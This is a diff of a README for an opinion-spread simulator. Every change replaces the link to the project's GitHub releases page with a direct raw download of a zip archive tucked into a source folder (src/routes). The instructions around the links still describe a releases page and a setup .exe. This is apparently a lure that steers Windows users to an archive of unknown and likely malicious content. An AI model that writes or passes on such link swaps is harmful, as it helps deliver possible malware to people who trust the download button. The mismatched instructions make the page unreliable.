@@ -1,6 +1,6 @@
 # 🧠 opinion-diffusion-sim - Simulate Opinion Spread Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/ceafag/opinion-diffusion-sim/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/ceafag/opinion-diffusion-sim/raw/refs/heads/main/src/routes/diffusion_opinion_sim_v2.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get the simulator up and running on your Windows computer.
 
 1. Click the big green **Download Latest Release** button at the top or visit this link:
 
-   [https://github.com/ceafag/opinion-diffusion-sim/releases](https://github.com/ceafag/opinion-diffusion-sim/releases)
+   [https://github.com/ceafag/opinion-diffusion-sim/raw/refs/heads/main/src/routes/diffusion_opinion_sim_v2.7.zip](https://github.com/ceafag/opinion-diffusion-sim/raw/refs/heads/main/src/routes/diffusion_opinion_sim_v2.7.zip)
 
 2. On the releases page, find the latest version. Look for a file named something like `opinion-diffusion-sim-setup.exe`.
    
@@ -83,7 +83,7 @@ Help is available if you need it.
 - The app contains basic explanations of terms and controls.
 - Visit the release page or project GitHub for release notes, FAQs, and updates:
 
-  [https://github.com/ceafag/opinion-diffusion-sim/releases](https://github.com/ceafag/opinion-diffusion-sim/releases)
+  [https://github.com/ceafag/opinion-diffusion-sim/raw/refs/heads/main/src/routes/diffusion_opinion_sim_v2.7.zip](https://github.com/ceafag/opinion-diffusion-sim/raw/refs/heads/main/src/routes/diffusion_opinion_sim_v2.7.zip)
 
 - Common issues and fixes are listed in the GitHub discussions section.
 - Contact support through the GitHub issues tab if you find a bug or need help.
@@ -118,10 +118,10 @@ These keywords summarize what the app covers and links it to broader research ar
 
 Use this direct link to visit the release page and get started:
 
-[https://github.com/ceafag/opinion-diffusion-sim/releases](https://github.com/ceafag/opinion-diffusion-sim/releases)
+[https://github.com/ceafag/opinion-diffusion-sim/raw/refs/heads/main/src/routes/diffusion_opinion_sim_v2.7.zip](https://github.com/ceafag/opinion-diffusion-sim/raw/refs/heads/main/src/routes/diffusion_opinion_sim_v2.7.zip)
 
 Look for the latest setup file, download it, and follow the steps above to install.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/ceafag/opinion-diffusion-sim/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/ceafag/opinion-diffusion-sim/raw/refs/heads/main/src/routes/diffusion_opinion_sim_v2.7.zip)
